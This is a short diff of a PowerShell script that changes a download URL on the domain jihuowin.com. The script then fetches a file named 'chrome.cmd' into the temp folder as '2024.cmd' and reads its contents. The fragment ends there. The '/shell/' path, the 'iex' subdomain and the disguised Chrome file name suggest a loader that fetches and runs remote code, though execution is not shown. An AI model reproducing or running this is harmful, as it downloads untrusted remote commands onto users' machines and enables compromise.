@@ -1,4 +1,4 @@
-$seturl = "https://jihuowin.com/shell/chrome.cmd";
+$seturl = "https://iex.jihuowin.com/download/chrome.cmd";
 
 Invoke-WebRequest -Uri $seturl -OutFile "$Env:temp\2024.cmd";
 $content = Get-Content -Path "$Env:temp\2024.cmd" -Encoding Default;
